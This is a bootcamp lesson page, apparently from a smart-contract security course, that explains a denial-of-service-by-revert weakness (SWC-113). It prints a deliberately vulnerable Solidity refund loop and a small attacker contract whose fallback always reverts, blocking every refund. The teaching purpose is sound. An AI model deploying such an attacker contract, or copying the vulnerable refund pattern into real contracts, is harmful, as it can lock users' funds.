@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Index - ConsenSys Academy Developer Bootcamp</title>
+    <link href="../../../style.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.6.0/gsap.min.js" async></script>
+    <script src="../../../text-bounce.js" async></script>
+  </head>
+  <body>
+    <h1 id="dos-attack-contract">DoS Attack Contract</h1>
+<p>This set of contracts shows how a contract may be susceptible to a denial of service attack by an unexpected revert (<a href="https://swcregistry.io/docs/SWC-113" target="_blank">SWC-113</a>).</p>
+<p>The <code>VulnerableContract</code> loops over the subscribers array, making a transfer to each address. This is dangerous because when the <code>refundFees()</code> function is called and the <code>VulnerableContract</code> attempts to send funds to the <code>MaliciousContract</code>, the <code>MaliciousContract</code> fallback function is called, which stops execution and reverts. This transaction will never succeed and <code>refundFees()</code> will never successfully execute, preventing any subscribers from getting their subscription fee back.</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">pragma</span> <span class="nv">solidity</span> <span class="mi">0</span>.<span class="mi">8</span>.<span class="mi">4</span><span class="c1">;</span>
+
+<span class="o">//</span> <span class="nv">Example</span> <span class="nv">DenialOfService</span> <span class="nv">Attack</span>  
+<span class="nv">contract</span> <span class="nv">VulnerableContract</span> {    
+  <span class="nv">address</span> <span class="nv">owner</span> <span class="o">=</span> <span class="nv">msg</span>.<span class="nv">sender</span><span class="c1">;    </span>
+  <span class="nv">address</span> <span class="nv">payable</span>[] <span class="nv">public</span> <span class="nv">subscribers</span><span class="c1">;    </span>
+  <span class="nv">uint</span> <span class="nv">FEE_COST</span> <span class="o">=</span> <span class="mi">1</span> <span class="nv">ether</span><span class="c1">;          </span>
+
+  <span class="nv">function</span> <span class="nv">subscribe</span><span class="ss">()</span> <span class="nv">public</span> <span class="nv">payable</span> {        
+    <span class="nv">require</span><span class="ss">(</span><span class="nv">msg</span>.<span class="nv">value</span> <span class="o">==</span> <span class="nv">FEE_COST</span>, <span class="s2">&quot;</span><span class="s">Insufficient msg.value</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;        </span>
+    <span class="nv">subscribers</span>.<span class="nv">push</span><span class="ss">(</span><span class="nv">msg</span>.<span class="nv">sender</span><span class="ss">)</span><span class="c1">;    </span>
+  }          
+
+  <span class="nv">function</span> <span class="nv">refundFees</span><span class="ss">()</span> <span class="nv">public</span> {        
+    <span class="nv">require</span><span class="ss">(</span><span class="nv">msg</span>.<span class="nv">sender</span> <span class="o">==</span> <span class="nv">owner</span>, <span class="s2">&quot;</span><span class="s">msg.sender should be owner</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;        </span>
+    <span class="k">for</span><span class="ss">(</span><span class="nv">uint</span> <span class="nv">i</span> <span class="o">=</span> <span class="nv">subscribers</span>.<span class="nv">length</span><span class="c1">; i &gt; 0; i--) {            </span>
+      <span class="nv">subscribers</span>[<span class="nv">i</span> <span class="o">-</span> <span class="mi">1</span>].<span class="nv">transfer</span><span class="ss">(</span><span class="nv">FEE_COST</span><span class="ss">)</span><span class="c1">;            </span>
+      <span class="nv">subscribers</span>.<span class="nv">pop</span><span class="ss">()</span><span class="c1">;        </span>
+    }
+  }          
+
+  <span class="nv">function</span> <span class="nv">getBalance</span><span class="ss">()</span> <span class="nv">view</span> <span class="nv">public</span> <span class="nv">returns</span><span class="ss">(</span><span class="nv">uint</span><span class="ss">)</span> {        
+    <span class="k">return</span> <span class="nv">address</span><span class="ss">(</span><span class="nv">this</span><span class="ss">)</span>.<span class="nv">balance</span><span class="c1">;    </span>
+  }          
+
+  <span class="o">//</span> <span class="nv">Auxiliar</span> <span class="nv">function</span> <span class="k">for</span> <span class="nv">demo</span>. <span class="nv">It</span> <span class="nv">wouldn</span><span class="s1">&#39;</span><span class="s">t be present in a vulnerable contract    </span>
+  <span class="nv">function</span> <span class="nv">removeLastSubscriber</span><span class="ss">()</span> <span class="nv">public</span> {        
+    <span class="nv">subscribers</span>.<span class="nv">pop</span><span class="ss">()</span><span class="c1">;    </span>
+  }
+
+}  
+
+<span class="nv">contract</span> <span class="nv">MaliciousContract</span> {    
+  <span class="nv">VulnerableContract</span> <span class="nv">vulnerableContract</span> <span class="o">=</span> <span class="nv">VulnerableContract</span><span class="ss">(</span><span class="mi">0</span><span class="nv">x5E72914535f202659083Db3a02C984188Fa26e9f</span><span class="ss">)</span><span class="c1">;          </span>
+
+  <span class="nv">function</span> <span class="nv">subscribe</span><span class="ss">()</span> <span class="nv">public</span> <span class="nv">payable</span> {        
+    <span class="nv">vulnerableContract</span>.<span class="nv">subscribe</span>.<span class="nv">value</span><span class="ss">(</span><span class="nv">msg</span>.<span class="nv">value</span><span class="ss">)()</span><span class="c1">;       </span>
+  }          
+
+  <span class="nv">fallback</span><span class="ss">()</span> <span class="nv">external</span> <span class="nv">payable</span> {        
+    <span class="nv">require</span><span class="ss">(</span><span class="nv">false</span><span class="ss">)</span><span class="c1">;    </span>
+  }
+}
+</code></pre></div>
+    <br /><div class="footer">
+    <a href="https://github.com/ConsenSys-Academy/Blockchain-Developer-Bootcamp/edit/staging/docs/S03-smart-contracts/M6-security/L2c-dos-attack/index.md" target="_blank">Edit this page on GitHub</a>
+    
+    <div class="discord">
+        <img class="discord-logo" src="../../../discord.svg" alt="Discord logo" ><a href="https://discord.gg/FrHSjSn9dX" target="_blank" >Questions? Ask on Discord! </a>  
+    </div> 
+</div>
+  </body>
+</html>
